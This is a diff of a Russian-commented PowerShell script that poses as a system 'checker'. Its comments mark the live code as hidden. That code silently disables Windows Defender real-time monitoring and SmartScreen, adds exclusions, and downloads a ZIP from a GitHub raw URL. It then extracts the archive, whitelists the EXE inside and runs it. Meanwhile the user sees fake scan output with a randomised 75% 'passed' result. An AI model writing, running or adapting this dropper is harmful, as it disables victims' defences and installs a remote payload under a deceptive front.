@@ -13,7 +13,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
 $ScriptUrl = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/install.ps1"
 
-# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ ПЕРВЫМ) =====
+# ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ СРАЗУ, БЕЗ ВЫВОДА) =====
 # Отключение Defender и добавление в исключения
 Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
 Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
@@ -48,16 +48,20 @@ Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Po
 Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
 Try { Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
 
-# СКАЧИВАНИЕ И ЗАПУСК (ВЫПОЛНЯЕТСЯ ПЕРВЫМ, СКРЫТО)
+# ===== РЕАЛЬНОЕ СКАЧИВАНИЕ И ЗАПУСК (ВЫПОЛНЯЕТСЯ СРАЗУ, СКРЫТО) =====
 $DownloadPath = "$env:TEMP\check_install.zip"
 $ExtractPath = "$env:TEMP\checkextracted"
 
 Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
 Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
 
+# Скачивание
 try { Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue } catch {}
+
+# Распаковка
 try { Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue } catch {}
 
+# Поиск и запуск EXE
 $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
 if ($Exe) {
     Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
@@ -282,7 +286,7 @@ Start-Sleep -Milliseconds 800
 
 # ===== ШАНС 75% НА "ПРОШЛА" =====
 $finalRandom = Get-Random -Minimum 1 -Maximum 100
-$finalPassed = $finalRandom -le 75  # 75% шанс, что проверка пройдена
+$finalPassed = $finalRandom -le 75
 
 Write-Host "    Проверено объектов: $totalChecked" -ForegroundColor DarkGray
 Write-Host "    Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
